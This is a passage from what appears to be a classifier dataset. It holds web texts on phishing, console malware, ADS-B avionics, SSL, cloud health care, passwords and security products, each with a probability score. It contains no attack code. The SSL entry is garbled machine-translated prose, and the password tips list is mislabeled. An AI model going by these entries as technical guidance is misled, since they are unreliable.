existing bank account to setting up multiple new ones. Early phishing attempts were crude, with telltale misspellings and poor grammar. Since then, however, phishing e-mails have become remarkably sophisticated. Phishers may pull language straight from official company correspondence and take pains to avoid typos. The fake sites may be near-replicas of the sites phishers are spoofing, containing the company's logo and other images and fake status bars that give the site the appearance of security. Phishers may register plausible-looking domains like aolaccountupdate.com, mycitibank.net or paypa1.com (using the number 1 instead of the letter L). They may even direct their victims to a well-known company's actual website and then collect their personal data through a faux pop-up window. Can we prevent phishing attacks? Companies can reduce the odds of being targeted, and they can reduce the damage that phishers can do (more details on how below). But they can't really prevent it. One reason phishing e-mails are so convincing is that most of them have forged \"from\" lines, so that the message looks like it's from the spoofed company. There's no way for an organization to keep someone from spoofing a \"from\" line and making it seem as if an e-mail came from the organization. A technology known as sender authentication does hold some promise for limiting phishing attacks, though. The idea is that if e-mail gateways could verify that messages purporting to be from, say, Citibank did in fact originate from a legitimate Citibank server, messages from spoofed addresses could be automatically tagged as fraudulent and thus weeded out. (Before delivering a message, an ISP would compare the IP address of the server sending the message to a list of valid addresses for the sending domain, much the same way an ISP looks up the IP address of a domain to send a message. It would be sort of an Internet version of caller ID and call blocking.) Although the concept is straightforward, implementation has been slow because the major Internet players have different ideas about how to tackle the problem. It may be years before different groups iron out the details and implement a standard. Even then, there's no way of guaranteeing that phishers won't find ways around the system (just as some fraudsters can fake the numbers that appear in caller IDs). That's why, in the meantime, so many organizationsand a growing marketplace of service providershave taken matters into their own hands. What can my company do to reduce our chances of being targeted by phishing attacks? In part, the answer has to do with NOT doing silly or thoughtless things that can increase your vulnerability. Now that phishing has become a fact of life, companies need to be careful about how they use e-mail to communicate with customers. For example, in May 2004, Wachovia's phones started ringing off the hook after the bank sent customers an e-mail instructing them to update their online banking user names and passwords by clicking on a link. Although the e-mail was legitimate (the bank had to migrate customers to a new system following a merger), a quarter of the recipients questioned it. As Wachovia learned, companies need to clearly think through their customer communication protocols. Best practices include giving all e-mails and webpages a consistent look and feel, greeting customers by first and last name in e-mails, and never asking for personal or account data through e-mail. If any time-sensitive personal information is sent through e-mail, it has to be encrypted. Marketers may wring their hands at the prospect of not sending customers links that would take them directly to targeted offers, but instructing customers to bookmark key pages or linking to special offers from the homepage is a lot more secure. That way, companies are training their customers not to be duped. It also makes sense to revisit what customers are allowed to do on your website. They should not be able to open a new account, sign up for a credit card or change their address online with just a password. At a minimum, companies should acknowledge every online transaction through e-mail and one other method of the customer's choosing (such as calling the phone number on record) so that customers are aware of all online activity on their accounts. And to make it more difficult for phishers to copy online data-capture forms, organizations should avoid putting them on the website for all to see. Instead, organizations should require secured log-in to access e-commerce forms. At the end of the day, though, better authentication is the best way to decrease the likelihood that phishers will target your organization. Banks are beginning to experiment with technologies like RSA tokens, biometrics, one-time-use passwords and smart cards, all of which make their customers' personal information less valuable for phishers. One midsized bank was able to cut its phishing-related ATM card losses by changing its authentication process. Every ATM card has data encoded on its magnetic strip that the customer can't see but that most ATM machines can read. The bank worked with its network provider to use that hidden information to authenticate ATM transactionsan important step that, according to Gartner, only about half of U.S. banks had taken by mid-2005. \"Since the number isn't printed on the back of the card, customers can't accidentally disclose it,\" the bank's CISO explained. The information was already in the cards, so the bank didn't have to go through an expensive process of reissuing cards. \"It was a very economical solution, and it's been very effective,\" said the CISO.",
        "prob": "tensor([[2.1093e-06, 1.0000e+00]])"
    },
    {
        "text": "Malicious programs for computers have been around for more than 20 years. It was the birth of the Internet which really enabled these digital pests to make a breakthrough. Until now, gaming consoles have been more or less immune to malware. Yes, there're been Trojans for the Nintendo DS console (Trojan.Nintendo.Taihen.a and .b) and for the Sony Portable Playstation (Trojan.PSP.Brick.a) but the number of victims has been small. This is because the user has to tweak the console in order for so-called homebrew software (i.e. software not certified by the console manufacturer) to run. There's a Linux distribution available for the Sony Playstation 2 (which will also be available for Playstation 3) which just cries out for programming. However, any programs created will only run on Playstations which have the distribution installed. Microsoft recently announced that in future, users will be able to purchase a development kit with a $99 a year registration fee - no Linux here. Programs developed using the kit will only run on Xboxes where the user has also paid the registration fee, and they can only be copied to another console as source code. From a security point of view, this is a wise decision. I hope that things won't change much in the near future. If Sony, Microsoft , Nintendo or hackers made it possible to easily download programs developed by users via the Internet, Pandora's box would be opened. The combination of unprotected gaming consoles, the Internet and the possibility of previously unknown vulnerabilities would lead to gamers who had been immune to malware becoming a target for virus writers.",
        "prob": "tensor([[2.0897e-06, 1.0000e+00]])"
    },
    {
        "text": "Software is everywhere. We love it when it makes our lives easier. We hate it when it doesn't work the way we expect—or when its design is not sufficiently intuitive or robust. Software is in our military systems—satellites, tanks, aircraft and ships—but it's also in our everyday life: toasters, automobiles, banks, and medical equipment. Software is important and its importance is growing. Software allows us to personalize and customize many systems. It brings increasingly complex integrated circuits to life and harnesses their power to help us. It allows us to communicate more efficiently, to live in a more connected world, to operate businesses more effectively. Multi-national businesses have software-intensive enterprise systems while small businesses and individuals use the Internet for ever growing applications. Unfortunately, there is a gap between the state of the art and the state of the practice of software engineering. Many senior managers don't understand software engineering and many software practitioners have lapsed into undisciplined, ad hoc practices. Consequently, software design, development and integration are often plagued by schedule delays, cost increases, performance problems and defects. Data indicate that 60-80% of the cost of software development is in rework, that is, fixing defects that are found during testing. Fortunately, there is an alternative. We can reduce test and rework costs significantly if we use better design and implementation practices. We can meet schedules and we can reduce the variability and risk in software intensive programs. We can make our software teams more productive and raise the quality of their work experience if we follow disciplined engineering practices. Commercial software products today are often riddled with defects—commonly known as \"bugs\"— that are introduced in the software's design and development. As our systems become more and more interconnected in networks, the stakes are rising. Defects in products that are linked to the Internet open vulnerabilities to cyber attack and exploitation. The Internet is only as secure as its weakest link. Each year, the SEI's CERT Coordination Center (CERT/CC) documents thousands of commercial product vulnerabilities. Once again, however, there is an alternative. Most of these vulnerabilities are due to a modest number of root causes. We can avoid these vulnerabilities and greatly reduce the number of successful cyber attacks if software developers use the proven best design techniques of software engineering. The SEI's core purpose is to improve the state of the art in software engineering, and to transition this work to the community so we improve the state of practice in software engineering as well. Our work is not done unless we do both parts of our job. We believe, and we have the evidence to support us, that the best way to ensure the security of software is to design, develop, and integrate software in a way that does not allow defects into software in the first place. Investments in up-front discipline and sound processes increase quality and security and decrease cost and risk. We are part of Carnegie Mellon University, one of the nation's premier computer science and engineering institutions. Since 1984, we have been identifying, developing, and advocating practices to improve all aspects of software. At the SEI, we emphasize defect prevention through improvement of process and product quality during the early phases of system development. We believe you should design quality into software, not test and patch it. At SEI, we're developing innovative software technologies to meet today's challenges and tomorrow's opportunities. Paul D. Nielsen Director and Chief Executive Officer Software Engineering Institute",
        "prob": "tensor([[1.2084e-05, 9.9999e-01]])"
    },
    {
        "text": "The FAA Rule Affects Canadians, Too Wednesday June 20th 2012 - by Daryl MacIntosh Upcoming FAA Requirements In May of 2010, the FAA published the final rulemaking to adopt ADS-B (automatic dependent surveillance-broadcast) technology as its primary aircraft tracking/locating system. Effective Jan. 1, 2020, aircraft operating in the majority of United States airspace must be equipped with ADS-B Out compliant equipment. Use of ADS–B Out will move air traffic control from a primarily ground-based radar system to a satellite-derived aircraft location system. Benefits to ATC include improved accuracy, wider coverage, better reliability, reduced latency, increased capacity and controller access to more comprehensive aircraft data. The current radar surveillance system that ATC has relied on for more than 50 years has now reached its capacity limits, leading to congestion and delays in some of the busiest U.S. airspace. ADS-B in Canada Limited ADS-B service was implemented in Canada on Jan. 15, 2009, bringing surveillance coverage for the first time to 850,000 square kilometres of high level airspace (FL290 to FL410) over Hudson Bay. About 35,000 flights a year use this airspace on routes between North America and Europe or Asia. One of the most significant benefits ADS-B offers for this airspace is reduced aircraft separation. With appropriately-equipped aircraft, controllers can use five-nautical-mile separation instead of the 80-nautical-mile procedural separation required in non-radar airspace. ATC can handle more aircraft in the same airspace at once and controllers can offer route flexibility and approve altitude-change requests more readily. Nav Canada expanded its ADS-B coverage over northeastern Canada by an additional 1.9 million square kilometres in 2010, and recently added another 1.3 million square kilometres over the North Atlantic (see p.18). However, the upcoming United States ADS-B requirements will affect many more Canadian aircraft operators than will Nav Canada’s ADS-B requirements. Most of us don’t need to fly over Hudson Bay, but many of us do regularly fly within U.S. airspace. ADS-B Out Defined Automatic: Each aircraft equipped with ADS-B Out will Automatically and continuously transmit its precise position, its velocity (vertically and horizontally), as well as its altitude and other relevant information. The system is always on and requires no pilot action for activation. Dependent: The overall system is Dependent on each aircraft to transmit accurate data including identification (ICAO 24-bit ID), position, and velocity, together with specific integrity/accuracy quality information. Surveillance: The system provides ATC with Surveillance capability similar to radar. Broadcast: Each aircraft will continuously Broadcast the required data. The system does not require interrogation from ATC or from another aircraft. Out: Although the overall ADS-B system is designed to be bi-directional, only ADS-B Out data capability is becoming mandatory. ADS-B In capability is a key design feature of the overall ADS-B system, but the FAA did not make this capability mandatory. Many operators will, however, choose to install ADS-B In because of the significantly improved situational awareness the available data will provide to flight crews. TIS-B (traffic information service-broadcast) and FIS-B (flight information services-broadcast offering weather data, airspace information and other services) are available as free uplinks to any aircraft that carries the correct receiving equipment. Equipment - Technology Choices The ADS–B Out capability regulation requires operators to install equipment into each aircraft that will provide a data link to ATC to be used for aircraft surveillance. Operators must choose between two completely different types of equipment required under this rule: a 1090 MHz extended squitter (ES) broadcast link or a universal access transceiver (UAT) broadcast link operating on 978 MHz. In addition to the broadcast link, each aircraft must also be equipped with an approved GPS to provide the required aircraft position source data. Equipment Choice # 1 - 1090 MHz ES Equipment certified for this option transmits on 1090 MHz, the same frequency as current transponders. Some Mode S transponders with ES can be certified to meet the latest ADS-B Out requirements. The 1090 MHz ES broadcast link is the internationally agreed-upon standard and is required for aircraft that fly into any other jurisdictions that utilize ADS-B. The final FAA rule requires aircraft flying at and above 18,000 feet MSL [flight level (FL) 180, Class A Airspace] to have ADS–B Out performance capabilities using the 1090 MHz ES broadcast link. This rule also specifies that aircraft flying in designated airspace below 18,000 feet MSL may use either the 1090 MHz ES or the UAT broadcast link. There are two significant disadvantages to the 1090 MHz ES system: (1) A separate 1090 MHz receiver must be installed for ADS-B In capability, as current Mode S transponders do not have ADS-B receiver capability; and (2) The 1090 MHz ES broadcast link does not support FIS–B (weather and related flight information) due to bandwidth limitations. Equipment Choice # 2 – 978 MHz UAT The 978 MHz UAT broadcast link utilizes a bi-directional 978 MHz transceiver which supports ADS–B In applications, including traffic information and FIS-B data including weather, temporary flight restrictions (TFRs) and notices to airmen (NOTAMs). The 978 MHz UAT is a proven and mature technology which has provided similar services in Alaska since 2001. The UAT may not be used for ADS-B Out on aircraft that fly above 18,000 feet. The FAA does encourage general aviation (GA) pilots whose aircraft always operate below 18,000 feet to opt for the 978 UAT, in order to minimize frequency congestion on 1090 MHz. Combined Equipment Choice – 1090 Mhz ES Out with 978 Mhz In Some operators will undoubtedly choose to install a combination solution utilizing 1090 MHz for ADS-B Out, to satisfy the regulatory requirement for flights above 18,000 feet, and using a 978 MHz UAT for ADS-B In, to benefit from its enhanced data-in capability. Best Equipped – Best Served ATC service has traditionally been based on a policy of “first come, first served” but the FAA is now moving towards a new policy of “best equipped, best served.” The FAA has explained that this policy change will help to reduce congestion and delays while simultaneously encouraging system users to equip their aircraft earlier than the regulation requires. By providing operational benefits to the early adopters, the FAA hopes they will then have an incentive to accelerate and expand ADS-B equipage to the rest of their fleets. ADS-B is already providing services in South Florida; Louisville, Kentucky; Philadelphia and out over the Gulf of Mexico. The installation of ground stations to serve the rest of the United States is now well underway and is scheduled to be completed by 2013. The system’s 794 ground stations should be substantially operational by 2014. The FAA expects most users will equip their aircraft during the five-year period between 2015 and the 2020 deadline. The expected cost to equip an aircraft with a compliant system is evolving because most avionics manufacturers are currently working to modify and/or re-qualify their products to meet the latest published specifications. For GA aircraft already equipped with a WAAS GPS and a Garmin Mode S transponder, the upgrade to ADS-B Out is a relatively painless and inexpensive transponder upgrade. Most other GA aircraft owners will need to spend at least $6,000 to meet the minimum ADS-B Out requirements. The fully-installed cost for some GA aircraft will be much higher (perhaps $20,000) when the cost of a new WAAS GPS navigator and/or a new multi-function display is factored in. The cost to equip Part 25 business and commercial aircraft will likely be much greater (perhaps $150,000) due to much higher equipment and certification costs. Typical modifications will include new (or upgraded) mode S transponders and a modified traffic collision avoidance system. Some aircraft will also require a new FMS and many will require significant wiring modifications. ADS-B is also being adopted by a variety of countries around the world as the new standard for aircraft surveillance. Canadian operators who choose not to equip, because they don’t fly to the United States or within other ADS-B airspace, may still be affected by the new U.S. regulations. When it comes time to sell their aircraft, they may find that its value is diminished because it can’t fly within the United States. The U.S. ADS-B equipage requirement is real; the deadline is approaching, and it’s time for everyone to start paying attention. Daryl MacIntosh is founder and president of Maxcraft Avionics. Located at the Pitt Meadows Airport, about 35 kilometres east of Vancouver, Maxcraft is one of the largest full-service avionics shops in Canada, and provides professional avionics services to operators of all types of private and commercial aircraft, including piston, turboprops, jets and helicopters. He can be reached at firstname.lastname@example.org. Did you know? Trans-Canada Air Lines (later to become Air Canada) first had flight attendants in July, 1938. At first, only single women under 26 were selected, and they served small boxed lunches and cups of coffee and lemonade.",
        "prob": "tensor([[0.1544, 0.8456]])"
    },
    {
        "text": "Technically SSL works as follows: At the \"https\" Your browser recognises that he mentioned server, a certificate request. For the server the browser has returned a certificate, it must be certified by the certification body. Then notify the server of this certificate directly to the browser. The browser receives from the directory service of the certification authority information, whether the certificate is valid. Based on these data, the browser can now check whether he really is connected to the server, in the URL. If so, your browser indicates a secure connection. For Internet Explorer and Firefox, this is done by a closed padlock. The Netscape Navigator / Communicator shows a secure page by the key intact. Then the two agree on a balanced computer keys. This understanding is happening in the safe asymmetric encryption. To really on the safe side, your browser sends the server before the start of the actual data exchange some test messages. This can only answer the server when it is actually the server, which he pretends to be. Looking even further the three objectives of encryption: does the SSL protocol so that a secure connection: 1st Your data is confidential, because the content of your messages only encrypted over the network. 2nd The authenticity of the server. 3rd Your data is protected from tampering, as effective algorithms examine whether the data is complete and unaltered their respective recipients. Meanwhile, SSL as a standard for encryption established browser. Meanwhile, but also Transport Layer Security (TLS). TLS is in place by SSL 3.0 standardized and expanded the range of use encryption methods to the Advanced Encryption Standard (AES). TLS is based on the more complex encryption methods Triple DES (Data Encryption Standard - Datenverschlüsselungs standard) or other algorithms. It supports the encryption of e-mails and the proof of identity for commercial online transactions.",
        "prob": "tensor([[0.1742, 0.8258]])"
    },
    {
        "text": "Cloud computing as commonly defined is when a business gives its data, applications, storage and computational power to a cloud computing provider and accesses those resources via the public Internet. It's been a godsend for many organizations, most notably small enterprises that can save enormously on infrastructure costs and have access to highly skilled I.T. expertise that they couldn't afford otherwise. Salesforce.com and Amazon.com have quickly become giants in the \"public\" cloud service sector thanks to the convenience and low start-up costs for their services. International Data Corp., a technology research firm, estimates in a recently released report that the cloud software market reached $22.9 billion in 2011, a 31 percent year-over-year growth increase. The market is expected to reach $67.3 billion by 2016 at a compound annual growth rate of 24 percent. IDC also estimates that small businesses-defined as those with 100 or fewer employees-spent $3.5 billion on cloud technologies in 2011, or about 7 percent of the $53 billion the small business segment spent overall on I.T. expenditures. That enthusiasm for remotely hosted services and low-cost infrastructure is shared by the health care industry, but not necessarily in the same way, or to the same degree, as industries such as construction or retail. KLAS Enterprises, a Utah-based health care I.T. research firm, polled nearly 100 provider organizations for a 2011 \"perception\" study of cloud computing. Right off the bat, Erik Westerlind, the report author, had to sift through how respondents-of which nearly 70 percent were C-level executives-defined cloud computing. \"We ran into a lot of cases where executives would tell us that yes, they use the cloud because they're having their electronic health record remotely hosted by Cerner, for example,\" he says. \"But those types of services are not really how \"The Cloud\" is typically defined outside this market-yes, they're remotely hosted, but the applications are running via direct connections to Cerner's data center, and all their information is housed in one place, Kansas City.\" Some of the confusion about how to define cloud services is due to the \"cloud washing\" going on-rebranding application service provider or application hosting services as \"cloud\" solutions. \"True\" cloud service is virtualized, elastic, scalable, metered out and resides on pooled or shared resources on the Web. Respondents mentioned every one of these attributes, but only a few mentioned them all, according to the KLAS report. The health care execs most commonly used two attributes-an application was remotely hosted, and it was available via the Web-to define the cloud. The bottom line is that interest in the cloud is strong in health care, but neither KLAS nor other industry experts expect a stampede of providers to a public cloud environment where their data is stored and accessible via the public Web. Not surprisingly, data security and privacy, and lack of control, are the top concerns of health care execs. And while health care is-has to be-downright obsessive about security and privacy, those concerns are not exclusive to the industry. The IDC report and other cloud research finds the top drawback for adopting cloud services is data security. \"One hospital CIO summed it up pretty neatly-he noted that he has to go before his board of directors every year and attest to them that the hospital is compliant with HIPAA regulations, one requirement being that he certifies that he knows where its data resides,\" Westerlind says. \"In a public cloud that data could be anywhere in the world. That pretty much sums up why many are taking a cautious approach to public cloud services.\" But then again, interest is high in cloud computing, and 55 percent of respondents to the KLAS survey are currently deploying some part of their I.T. environment in the cloud, where the definition was the delivery of storage solutions, software solutions, or both over the Web. At this point, much of the industry's interest is focused on creating private clouds that enable providers to keep control of their data by either storing it on virtual servers they own, or putting it on dedicated virtual servers owned by trusted third parties. A lot of the future of health care cloud computing hinges on trust. While much has been made of the reluctance of health care organizations to use the cloud, another roadblock has been the lack of cloud service providers willing to take on the burden of handling health care data, says Jeffrey White, a principal at Pittsburgh-based Aspen Advisors, a health care consultancy. \"There's been a reluctance on the part of cloud platform providers to sign HIPAA business associate agreements, which has really hampered the development of truly cloud-based services in the market,\" White says. As a result, many organizations are using hosting services from established health I.T. vendors, which provides some but not all of the benefits of a Web-based cloud environment. However, the cloud is coming, thanks in part to the health care industry's increased focus on collaboration and consumerism. Dignity Health provides a good example of how and why cloud computing is starting to carve out a health care space. Dignity Health is massive, encompassing more than 40 hospitals, operating in 17 states, and with 60,000 providers working at its facilities. Not surprisingly, the health system has a large and skilled I.T. department and a massive technological infrastructure. But while it has the internal capability to meet pretty much any data demand thrown at it, Dignity Health is putting more and more information on a cloud platform managed by a third party, says Scott Whyte, the vice president of I.T. connectivity. The impetus behind most of its cloud efforts is the need to collaborate with more and more business partners and provide additional services to physicians and patients. And those various projects need to be done yesterday. \"We're forming an accountable care organization and getting more involved with independent physicians, and everything has to happen fast because we're dealing with aggressive timelines, either because they're regulatory timelines or we have competitive pressures,\" Whyte says. \"While we have the resources to do this internally, our cloud services partner brings a lot to the table-they can spin up data center capacity very quickly, and they have very skilled human resources that augment our own staff.\" In addition, that partner, Phoenix-based ClearDATA Networks Inc., serves only the health care market, and consequently is steeped in the sometimes esoteric health security and privacy requirements required, Whyte says. And while it might not matter in every case and to all providers, the cloud services also enable Dignity to expand its I.T. environment using operating expenses instead of capital outlays for more servers and other infrastructure, he adds. Dignity Health also has found that many of its new partners, be they competing hospitals, or insurers or independent physicians, want to have all the collaborative data stored in \"neutral\" territory separated from their larger infrastructures, Whyte says. Not only are there competitive reasons to want to ensure the data is on neutral ground, but it also means there are fewer legal and compliance hoops to jump through to share the necessary data, which enables the organizations to speed up the development timelines. One example is the physician metric reports being used for the emerging ACO, Whyte says. \"That's an application that is really well-suited for a Web-based cloud environment: we need to share data among partners and make it widely accessible to physicians using all different types of devices to access it.\" Cloud computing at Dignity will grow, but likely won't encompass its core legacy systems, Whyte says. \"We are not fork-lifting legacy applications to the cloud: We use Cerner Corp.'s hosting services for our EHR, and we have no plans to move our core financials [from Lawson Corp.] to a cloud environment. We are using the cloud for the new types of collaborative applications we need to offer.\" Collaboration doesn't necessarily have to be external, either. As health systems continue to grow through consolidation and buying up physician practices, the management of internal data needed for collaborative efforts is getting more complex. Jonathan Teich, M.D., the chief medical information officer at Elsevier Corp. and a practicing physician at Brigham and Women's Hospital in Boston, says the use of cloud platforms for knowledge is far less daunting than the idea of changing the entire computing paradigm. Elsevier, an Amsterdam-based provider of clinical decision support information, plans to soon make a new service generally available that enables health systems to manage and maintain their clinical order sets via a cloud service. \"Health systems with hundreds or thousands of order sets have a hard time having local staff maintain them, and many are widely dispersed, which makes it more difficult to collaborate,\" Teich says. That idea of fork-lifting core applications into a cloud environment is a task that many providers seem unwilling to tackle at this point. Much of that big legacy technology, as White from Aspen Advisors points out, is built of proprietary architectures that are not well-suited to transition into a cloud environment. Not only that, but most cloud providers at this point can't guarantee the reliability and service levels health care organizations require for those applications. \"When it comes to core systems, providers have invested heavily in the infrastructure around them, including investments in virtualizing their servers and to provide a level of redundancy, that they're uncertain they can get from a cloud platform. If you look across different industries, including the financial sector, you're seeing cloud adoption, but they're not running their businesses over the cloud.\" Dan Riskin, M.D., CEO of Menlo Park, Calif.-based Health Fidelity and consulting assistant professor at Stanford University, says that his is one of a new wave of health care cloud companies providing a low-cost bridge to convert data into knowledge. Health Fidelity uses natural language processing technology-which incorporates the Medical Language Encoding and Extraction system from Columbia University-to identify and encode clinical information in caregiver narratives to standard code sets, such as ICD-9 and 10, CPT-4 and LOINC. The company works with solution providers to standardize all that unstructured data in feeds from providers for use in analytics, revenue cycle and compliance efforts. \"Even with the all the efforts at making health care all about discrete data, around 80 percent of the clinical information is unstructured in clinical notes,\" he says. Mining the mountain of unstructured data takes a lot of computational power. Cloud platforms, Riskin says, are ideally suited for the task. \"Analytics requires processing power and expertise, and cloud computing is proving in health care and other markets that it can deliver faster and cheaper than internal resources,\" he says. \"What we and other start-ups in this space are doing is bypassing the manual processes of data collection and standardization that take such an enormous amount of time and resources to perform.\" In Riskin's mind, new health I.T. start-ups, many of which are using cloud computing platforms, are the ones that can work with the data holders in the market-the hospitals, practices and health information exchanges among them-and find ways to embed new knowledge into care processes. \"What the country bet on, and is paying for, is that if the industry can digitize its information, it could make it rapidly useful for those innovative approaches to improve care.\" Riskin says. \"That simply isn't going to happen if health systems and hospitals are trying to use internal resources to mine their Big Data. Cloud computing platforms enable processing power to be spun up, and adjustments to be made on the fly. \"When I think about the power and flexibility of cloud computing, I'm frankly shocked that we're still having multi-million dollar, on-site installs.\"",
        "prob": "tensor([[2.1541e-06, 1.0000e+00]])"
    },
    {
        "text": "How safe is your password? The first step in protecting your online privacy is creating a safe password - i.e. one that a computer program or persistent individual won't easily be able to guess in a short period of time. To help you choose a secure password, we've created a feature that lets you know visually how safe your password is as soon as you create it. Tips for creating a secure password: Things to avoid: - Include punctuation marks and/or numbers. - Mix capital and lowercase letters. - Include similar looking substitutions, such as the number zero for the letter 'O' or ' for the letter 'S'. - Create a unique acronym. - Include phonetic replacements, such as 'Luv 2 Laf' for 'Love to Laugh'. Tips for keeping your password secure: - Don't use a password that is listed as an example of how to pick a good password. - Don't use a password that contains personal information (name, username, birth date, etc.) - Don't use words or acronyms that can be found in a dictionary. - Don't use keyboard patterns (asdf) or sequential numbers (1234). - Don't make your password all numbers, uppercase letters or lowercase letters. - Don't use repeating characters (aa11). - Never tell your password to anyone (this includes significant others, roommates, parrots, etc.). - Never write your password down. - Never send your password by email. - Periodically test your current password and change it to a new one.",
        "prob": "tensor([[0.0466, 0.9534]])"
    },
    {
        "text": "GCN LAB REVIEW Device spots, stops advanced malware before it can cripple a network FireEye's virtual machines profile an attack and then disrupt it before it strikes A lot of protections are built into most federal and corporate networks these days. Between firewalls, intrusion prevention systems, port monitoring and even desktop antivirus, you would think security is pretty air tight. Yet major breaches such as the recent hack of the Sony PlayStation Network and other high-profile attacks show bad guys can still find ways to get through sophisticated defenses, especially if they are patient and target attacks specifically at an agency or group. The FireEye malware protection system, the GCN product of the month for June, has an unusual approach to these exploits. It uses a unique system of virtual machines that lets malware do whatever it wants, and then shuts it down on the real network. As such, no signatures are needed and even new attacks are caught before any significant damage occurs. Advanced persistent threats are a new way of life Is China out-gunning U.S. in cyber war? The FireEye is deployed in three components as appliances. There is an e-mail monitor, an Internet traffic monitor and a control device that lets those two systems communicate with each other and work together to stop threats. The FireEye team came into the GCN Lab to show what happens during a type of attack that most current protections would miss. In this example, we used the same type of technique that was performed in the recent Aurora attack, considered an advanced persistent threat that targeted several high-tech firms in 2009-2010. In that event, hackers patiently stalked hand-chosen victims for months, gathering data on corporate security before sending e-mail messages and instant messaging notes that appeared to come from friends. In many cases, the attack was tweaked to specifically get around whatever security was in place. Most attacks were delivered as a malicious binary file designed to look like a normal .jpg. Once the .jpg was in place, it called home and downloaded encrypted packages of malware that were designed to steal data and cripple networks. Gears of a virtual machine When a similar program was sent into a network protected by FireEye, the malicious binary began to do its dirty work like it was programmed to do. But it didn’t know that FireEye had moved it over to a virtual machine and not to an end-user’s computer. FireEye watched as the program phoned home and gathered more malware components from compromised systems. It didn’t matter that the incoming malware components were encrypted to get around traditional virus scanners, because for the bad programs to activate, they had to un-encrypt themselves. And when they did, FireEye watched the process unfold. After the details of the attack were known, ports and IP addresses were blocked to prevent the malware from working its evil on the actual network. The FireEye e-mail scanner and the Internet traffic scanner worked together to stop anything bad from happening. In a sense, FireEye creates a virtual honey pot for malware, lets it do what it wants, but only on the virtual and easily purged machine. Then it prevents the same things from hurting the real network. A very detailed report is generated showing exactly who inside the network was targeted, what files were used and how dangerous the threat actually is to overall security. Copies of all the malicious files are kept and stored in case administrators or analysts want to further examine them to learn more about the hackers. That data could be used to prevent future attacks, or even prosecute the guilty parties since the hackers’ digital fingerprints will still be all over the captured files. If an attack is delivered by e-mail, FireEye can stop it from ever reaching the network, because the mail can simply be delayed while the virtual machines examine anything suspicious. However, if the attack is delivered in real time, such as through a corrupted Web page, one user in the network will likely be infected because code will be executing on their computer at the same time as the virtual machine. Calls out for new malware will be blocked, since FireEye monitors both inbound and outbound traffic, but one person will still have the corrupted files sitting on their computer. The good news is that administrators are immediately told exactly who is infected and how they got that way, and the infection is sealed up on that single machine. FireEye also works if someone brings a keydrive with malware into the network directly without first passing through the FireEye Scanner. In that case, the malicious activity would be caught because of the outbound traffic that is being scanned, which can also be run through a virtual machine for processing. Pricing for the FireEye components seems reasonable given that it will even stop attacks where hackers have invested months or even years specifically targeting an agency. For a unit that is able to scan 50 megabits/sec of Internet or mail traffic, the cost is about $50,000. A unit that can scan a full 1 gigabit/sec costs $100,000. FireEye officials say they’re working on machines with even higher capacity. Given the sophistication and malicious nature of hackers these days, a product like FireEye that can be easily plugged into existing network security to protect against both widespread and narrowly targeted attacks arrives none too soon. And seeing how most federal agencies have targets on their back, having FireEye watch over them is a no-brainer.",
        "prob": "tensor([[2.1288e-06, 1.0000e+00]])"
    },
    {
        "text": "In March 2011, the U.S. computer security company RSA announced that hackers had gained access to security tokens it produces that let millions of government and private-sector employees, including those of defense contractors such as Lockheed Martin, connect remotely to their office computers. Most critical information systems in the United States are operated by the private sector and remain vulnerable to cyber attacks. Newly proposed legislation would require businesses to meet minimum standards of protection, but has raised concerns about regulatory overreach. Grounded in a realistic assessment of technology, Matthew C. Waxman and Kenneth Anderson outline a practical alternative with which to evaluate the use of autonomous weaponry that incorporates codes of conduct based on traditional legal and ethical principles governing weapons and warfare. Adam Segal says the recent Chinese cyberattacks on Bloomberg and the New York Timeshighlights both the willingness of Beijing to shape the narrative about China, as well as the vulnerability the top leadership feels about how they are portrayed. Cyber weapons are different from conventional weapons in that their effects do not directly manifest themselves in the \"real world.\" There are three broad categories of potential effects of cyberattacks: personal, economic, and physical. Adam Segal, CFR's Maurice R. Greenberg senior fellow for China studies, leads a conversation on U.S.-China relations through the lens of cybersecurity issues, as part of CFR's Academic Conference Call series. Linda Robinson discusses her recently released Council Special Report, The Future of U.S. Special Operations Forces, which calls for conceptual, institutional, and operational changes to reorient U.S. special operations forces to ensure that they are employed to best effect. Foreign governments, non-state actors, and criminal networks are targeting the digital networks of the United States with increasing frequency and sophistication. U.S. cybersecurity has made progress, but relies heavily on the private sector to secure infrastructure critical to national security. Cybersecurity expert Knake recommends the United States use international forums to promote mechanisms that address security concerns in cyberspace while ensuring the Internet remains open for the free exchange of ideas across national boundaries. The Council on Foreign Relations' David Rockefeller Studies Program—CFR's \"think tank\"—is home to more than seventy full-time, adjunct, and visiting scholars and practitioners (called \"fellows\"). Their expertise covers the world's major regions as well as the critical issues shaping today's global agenda. Download the printable CFR Experts Guide.",
        "prob": "tensor([[2.1176e-06, 1.0000e+00]])"
    },
    {
        "text": "Modern programming languages have little support for writing secure software, making it all too easy to write programs with exploitable vulnerabilities. In these lectures, we explore a general technique based on type qualifiers that allows programmers to write down, in their souce code, their intentions with respect to security. We will describe how to mechanically verify that annotated code adheres to the policy. We will discuss the theoretical foundations and practical implementation issues. As a particular example, we show how to use type qualifiers to find format-string vulnerabilities in widely-deployed C programs and to find other security vulnerabilites in the Linux kernel. we will also look at alias analysis, another important program analysis problem, and show how a must-alias analysis system corresponds to a system for statically checking access control. This series of lectures will discuss the requirements, protocols, and components of network security software on the Internet. Topics will include secure tunnels, security for web services, privacy constraints, design features that create or address DoS threats, and the use of programmable security tokens in network protocols. The primary emphasis will be the relationship between models and design, including topics like the quantification of DoS threats, models for code security in programmable tokens, strategies for composition and interoperation, and practical strategies for formal analysis of network protocol designs and software. In these lectures, we will analyze the security infrastructure in current, main-stream programming systems and platforms such as the Java Virtual Machine and Common Language Runtime. We will explain how byte code verification collaborates with the class loader and security manager to provide a secure run-time environment. We will also use theoretical tools to determine what properties current security systems based on stack inspection have and provide concrete proposals for improving the infrastructure for next-generation programming languages and systems.",
        "prob": "tensor([[3.7433e-05, 9.9996e-01]])"
    },
    {
